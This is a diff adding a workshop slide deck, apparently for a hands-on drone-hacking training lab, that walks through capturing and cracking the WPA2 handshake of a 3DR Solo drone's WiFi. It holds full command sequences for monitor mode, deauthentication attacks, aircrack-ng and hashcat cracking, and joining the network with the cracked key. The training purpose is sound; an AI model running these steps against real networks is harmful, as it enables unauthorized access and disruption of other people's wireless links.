@@ -1,0 +1,324 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Module 12 – Lab: Cracking Wireless Communications</title>
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/reveal.js@4.6.0/dist/reset.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/reveal.js@4.6.0/dist/reveal.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/reveal.js@4.6.0/dist/theme/black.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/reveal.js@4.6.0/plugin/highlight/monokai.css">
+    <style>
+    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700;800&family=JetBrains+Mono:wght@400;600&display=swap');
+    :root {
+        --dw-bg: #080808; --dw-panel: #111111; --dw-border: #1a1a1a;
+        --dw-green: #68E01A; --dw-green-glow: rgba(104,224,26,0.1); --dw-green-border: rgba(104,224,26,0.3);
+        --dw-white: #f0f0f0; --dw-gray: #7a8290;
+        --r-background-color: #080808; --r-main-color: #f0f0f0; --r-heading-color: #ffffff;
+        --r-link-color: #68E01A; --r-main-font: 'Inter', system-ui, sans-serif;
+        --r-heading-font: 'Inter', system-ui, sans-serif; --r-code-font: 'JetBrains Mono','Courier New',monospace;
+        --r-main-font-size: 26px;
+    }
+    .reveal-viewport { background: var(--dw-bg); }
+    .reveal .slides { text-align: left; }
+    .reveal h1, .reveal h2, .reveal h3 { text-transform: none; font-weight: 700; }
+    .reveal h1 { color: var(--dw-green); font-size: 1.9em; letter-spacing: -1px; }
+    .reveal h2 { color: var(--dw-white); border-bottom: 2px solid var(--dw-green); padding-bottom: 10px; margin-bottom: 22px; font-size: 1.15em; }
+    .reveal h3 { color: var(--dw-green); font-size: 0.9em; text-transform: uppercase; letter-spacing: 2px; margin-bottom: 12px; }
+    .reveal a { color: var(--dw-green); }
+    .reveal p, .reveal li { line-height: 1.55; }
+    .reveal ul li { margin-bottom: 8px; }
+    .reveal ul li::marker { color: var(--dw-green); }
+    .reveal .progress span { background: var(--dw-green); }
+    .reveal .controls { color: var(--dw-green); }
+    .reveal .slide-number { color: var(--dw-green); background: rgba(0,0,0,0.7); font-family: var(--r-code-font); font-size: 0.52em; padding: 4px 10px; border-radius: 4px; }
+    .reveal .slides > section { background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='56' height='97' viewBox='0 0 56 97'%3E%3Cpath fill='none' stroke='%23161616' stroke-width='1' d='M28 0l28 16.3v32.7L28 65.3 0 49V16.3zM28 32l28 16.3v32.7L28 97 0 80.7V48z'/%3E%3C/svg%3E"); background-size: 56px 97px; }
+    .tag { display: inline-block; padding: 3px 12px; border-radius: 20px; font-size: 0.6em; font-weight: 700; letter-spacing: 1px; text-transform: uppercase; margin-right: 6px; }
+    .tag-presentation { border: 1px solid var(--dw-green); color: var(--dw-green); background: var(--dw-green-glow); }
+    .tag-lab { border: 1px solid #60a5fa; color: #93c5fd; background: rgba(96,165,250,0.1); }
+    .tag-activity { border: 1px solid #a78bfa; color: #c4b5fd; background: rgba(167,139,250,0.1); }
+    .objective-box { background: var(--dw-green-glow); border-left: 3px solid var(--dw-green); padding: 12px 18px; border-radius: 0 6px 6px 0; margin: 8px 0; }
+    .warning-box { background: rgba(239,68,68,0.08); border-left: 3px solid #ef4444; padding: 12px 18px; border-radius: 0 6px 6px 0; margin: 8px 0; }
+    .phase-box { background: var(--dw-green-glow); border-left: 3px solid var(--dw-green); padding: 10px 16px; border-radius: 0 6px 6px 0; margin: 8px 0; font-weight: 600; color: var(--dw-green); }
+    .terminal { background: #050505; border: 1px solid var(--dw-border); border-top: 2px solid var(--dw-green); border-radius: 0 0 8px 8px; padding: 16px; font-family: var(--r-code-font); font-size: 0.94em; line-height: 1.7; color: var(--dw-green); white-space: pre; overflow-x: auto; }
+    .terminal::before { content: '\25CF \25CF \25CF'; display: block; color: #252525; margin-bottom: 10px; letter-spacing: 5px; font-size: 0.9em; }
+    .reveal pre { margin: 0; box-shadow: none; }
+    .reveal pre code { background: #050505 !important; color: var(--dw-green) !important; border: 1px solid var(--dw-border); border-radius: 6px; padding: 14px; font-size: 0.94em; }
+    .two-col { display: grid; grid-template-columns: 1fr 1fr; gap: 28px; align-items: start; }
+    .reveal table { border-collapse: collapse; width: 100%; font-size: 0.72em; }
+    .reveal table th { background: var(--dw-green-glow); color: var(--dw-green); border: 1px solid var(--dw-green-border); padding: 8px 12px; font-weight: 600; text-transform: uppercase; letter-spacing: 0.5px; font-size: 0.82em; }
+    .reveal table td { border: 1px solid var(--dw-border); padding: 8px 12px; color: var(--dw-white); vertical-align: top; }
+    .reveal table tr:nth-child(even) td { background: rgba(255,255,255,0.02); }
+    .highlight-green { color: var(--dw-green); font-weight: 600; }
+    .highlight-red { color: #f87171; font-weight: 600; }
+    .highlight-yellow { color: #fbbf24; font-weight: 600; }
+    .highlight-blue { color: #60a5fa; font-weight: 600; }
+    .reveal strong, .reveal b { color: var(--dw-green); }
+    .reveal :not(pre) > code { color: var(--dw-green); }
+    </style>
+</head>
+<body>
+<div class="reveal">
+<div class="slides">
+
+<section data-background-gradient="radial-gradient(circle at 20% 50%, #060606 0%, #080808 60%)">
+    <div style="text-align:center; padding-top: 40px;">
+        <p><span class="tag tag-lab">LAB</span><span style="color:var(--dw-gray); font-size:0.7em;">60 minutes</span></p>
+        <h1 style="font-size:2em; margin-top: 16px;">Lab: Cracking Wireless Communications</h1>
+        <h3 style="color:var(--dw-gray); font-weight:300; margin-top: 8px;">Module 12</h3>
+        <hr style="border-color: var(--dw-green-border); margin: 24px auto; width: 60%;">
+        <p style="color:var(--dw-green); font-size:0.9em;">Day 2 – RF Communications</p>
+        <p style="color:var(--dw-gray); font-size:0.7em; margin-top: 40px;">Hack Our Drone Workshop &mdash; Dark Wolf Solutions</p>
+    </div>
+</section>
+
+<section>
+    <h2>Objectives</h2>
+    <div class="objective-box">Capture a WPA2 4-way handshake from the drone's GCS WiFi network</div>
+    <div class="objective-box">Crack the captured handshake with a dictionary attack</div>
+    <div class="objective-box">Apply the narrow channel bandwidth technique to improve capture speed</div>
+    <div class="objective-box">Gain unauthorized access to the drone network using the cracked key</div>
+</section>
+
+<section>
+    <h2>Prerequisites</h2>
+    <ul>
+<li>
+<p>Kali Linux laptop</p>
+</li>
+<li>
+<p>TP-Link USB WiFi adapter (supports monitor mode)</p>
+</li>
+<li>
+<p>Target: 3DR Solo SoloLink WiFi</p>
+</li>
+</ul>
+</section>
+
+<section>
+    <h2>Background: WPA2 Authentication</h2>
+    <p>WPA2-PSK (Pre-Shared Key) authentication uses a 4-way handshake to derive session keys:</p>
+<pre><code>Client                           AP
+  |                               |
+  |--- Association Request ------&gt;|
+  |&lt;-- ANonce (random) -----------|   (Message 1)
+  |--- SNonce + MIC -------------&gt;|   (Message 2)
+  |&lt;-- GTK + MIC (encrypted) ----|   (Message 3)
+  |--- ACK --------------------- &gt;|   (Message 4)
+</code></pre>
+<p>The <strong>4-way handshake</strong> is captured from the air. The PSK can then be brute-forced offline because:</p>
+<ol>
+<li>
+<p>The attacker captures messages 1 and 2 (both contain public nonces)</p>
+</li>
+<li>
+<p>The PSK is used to derive the PMK and then the PTK</p>
+</li>
+<li>
+<p>An attacker can test candidate passwords: PMK = PBKDF2(HMAC-SHA1, password, SSID, 4096, 256)</p>
+</li>
+</ol>
+</section>
+
+<section>
+    <h2>Phase 1: Kali USB passthrough</h2>
+    <p>In VirtualBox you need to confgure the USB passtrough to be able to see the WiFi card in your Kali Linux.</p>
+<ul>
+<li>Find the devices menu in VirtualBox and click on <code>Realtek 802.11ac WLAN Adapter</code></li>
+</ul>
+<p><img src="../img/realtek.png" style="width: 80%; height: auto;" align="center"></p>
+</section>
+
+<section>
+    <h2>Phase 2: Setup Monitor Mode</h2>
+    <pre><code class="language-bash"># Check your WiFi adapters
+iwconfig
+ip link show
+
+# Identify the TP-Link adapter (usually wlan1)
+# Kill processes that interfere with monitor mode
+sudo airmon-ng check kill
+
+# Start monitor mode on the TP-Link adapter
+sudo airmon-ng start wlan1
+
+# Verify monitor mode is active
+iwconfig
+# Should show wlan1mon (or similar) in Monitor mode
+</code></pre>
+</section>
+
+<section>
+    <h2>Phase 2: Survey the Wireless Environment</h2>
+    <pre><code class="language-bash"># Scan for available networks
+sudo airodump-ng wlan1mon
+
+# Look for your target:
+# BSSID: (MAC address of Solo/Specta AP)
+# ESSID: SoloLink_XXXXXXXX or SpectraXXXXXX
+# CH: channel number
+# ENC: WPA2
+
+# Note the BSSID and channel for your target
+</code></pre>
+</section>
+
+<section>
+    <h2>Phase 3: Capture the 4-Way Handshake</h2>
+    <pre><code class="language-bash"># Start targeted capture (replace with your target values)
+sudo airodump-ng wlan1mon \
+    --bssid &lt;TARGET_BSSID&gt; \
+    --channel &lt;TARGET_CH&gt; \
+    --write solo-handshake
+
+# airodump-ng will write files:
+# solo-handshake-01.cap  (packet capture)
+# solo-handshake-01.csv  (scan log)
+</code></pre>
+</section>
+
+<section>
+    <h2>Trigger the handshake</h2>
+    <p><strong>Option A — wait</strong></p>
+<ul>
+<li>
+<p>Wait for a device to connect or reconnect to the AP</p>
+</li>
+<li>
+<p>This can take several minutes</p>
+</li>
+</ul>
+<p><strong>Option B — deauth attack</strong></p>
+<pre><code class="language-bash"># In a separate terminal: send deauth packets to force reconnection
+sudo aireplay-ng --deauth 3 -a &lt;TARGET_BSSID&gt; wlan1mon
+# -a: AP BSSID
+# Sends 3 deauthentication frames → client will reconnect → handshake captured
+</code></pre>
+<p><strong>In airodump-ng output, look for:</strong></p>
+<pre><code>[ WPA handshake: XX:XX:XX:XX:XX:XX ]
+</code></pre>
+<p>This confirms the handshake was captured.</p>
+</section>
+
+<section>
+    <h2>Phase 4: Crack the Handshake (1/3)</h2>
+    <h3>Option A: Dictionary Attack</h3>
+<pre><code class="language-bash"># Use rockyou.txt wordlist (included in Kali)
+sudo aircrack-ng solo-handshake-01.cap \
+    -w /usr/share/wordlists/rockyou.txt \
+    -e SoloLink_XXXXXXXX
+
+# If successful:
+# KEY FOUND! [ sololink ]
+</code></pre>
+</section>
+
+<section>
+    <h2>Phase 4: Crack the Handshake (2/3)</h2>
+    <h3>Option B: Custom Wordlist</h3>
+<p>Create a targeted wordlist based on OSINT about the target:</p>
+<pre><code class="language-bash"># Using crunch to generate all 8-character numeric passwords
+crunch 8 8 0123456789 &gt; custom-wordlist.txt
+
+# Using cewl to generate words from a website
+cewl https://3dr.com -d 2 -m 5 &gt; 3dr-wordlist.txt
+
+# Combine lists
+cat rockyou.txt 3dr-wordlist.txt &gt; combined.txt
+
+aircrack-ng solo-handshake-01.cap -w combined.txt -e SoloLink_XXXXXXXX
+</code></pre>
+</section>
+
+<section>
+    <h2>Phase 4: Crack the Handshake (3/3)</h2>
+    <h3>Option C: hashcat (GPU accelerated)</h3>
+<pre><code class="language-bash"># Convert cap file to hashcat format
+hcxpcapngtool -o hash.hc22000 solo-handshake-01.cap
+
+# Run hashcat (WPA2 = mode 22000)
+hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt
+</code></pre>
+</section>
+
+<section>
+    <h2>Phase 5: Narrow Channel Bandwidth Technique</h2>
+    <p>Some WiFi adapters have trouble capturing full 20/40 MHz channel width frames. The <strong>narrow channel bandwidth</strong> technique reconfigures the AP to use a narrower channel width, making capture more reliable.</p>
+<p><strong>How it works:</strong></p>
+<ol>
+<li>
+<p>Access the target router's admin interface (possible if you have credentials from a prior step)</p>
+</li>
+<li>
+<p>Set channel bandwidth to 5 MHz or 10 MHz</p>
+</li>
+<li>
+<p>This reduces the signal bandwidth — easier to capture with a narrower-filter SDR</p>
+</li>
+</ol>
+<pre><code class="language-bash"># If you have access to the OpenWRT router (GL.iNet from the UART lab):
+ssh root@192.168.8.1
+
+# Edit wireless config
+vim /etc/config/wireless
+# Find: option htmode 'HT20'
+# Change to: option chanbw '10'
+# Apply:
+wifi
+
+# On Kali, configure adapter to match narrow channel
+iwconfig wlan1mon channel 6
+# Use airmon-ng with the narrower channel
+sudo airodump-ng wlan1mon --channel 6
+</code></pre>
+</section>
+
+<section>
+    <h2>Phase 6: Connect with Cracked Password</h2>
+    <pre><code class="language-bash"># Stop monitor mode
+sudo airmon-ng stop wlan1mon
+
+# Connect to target WiFi with cracked password
+nmcli dev wifi connect &quot;SoloLink_XXXXXXXX&quot; password &quot;sololink&quot;
+
+# Verify connectivity
+ip a
+ping 10.1.1.1
+</code></pre>
+</section>
+
+<section>
+    <h2>Discussion Questions</h2>
+    <ol>
+<li>
+<p>How long did the crack take? What does this tell you about password complexity requirements?</p>
+</li>
+<li>
+<p>The default SoloLink password is <code>sololink</code> — how would you find this without cracking?</p>
+</li>
+<li>
+<p>What would make this WiFi network significantly harder to crack?</p>
+</li>
+<li>
+<p>At what point in the attack chain does RF-layer security fail vs. application-layer security?</p>
+</li>
+</ol>
+</section>
+</div>
+</div>
+<script src="https://cdn.jsdelivr.net/npm/reveal.js@4.6.0/dist/reveal.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/reveal.js@4.6.0/plugin/highlight/highlight.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/reveal.js@4.6.0/plugin/notes/notes.js"></script>
+<script>
+Reveal.initialize({
+    hash: true,
+    slideNumber: 'c/t',
+    transition: 'fade',
+    transitionSpeed: 'fast',
+    backgroundTransition: 'none',
+    mouseWheel: true,
+    plugins: [RevealHighlight, RevealNotes]
+});
+</script>
+</body>
+</html>
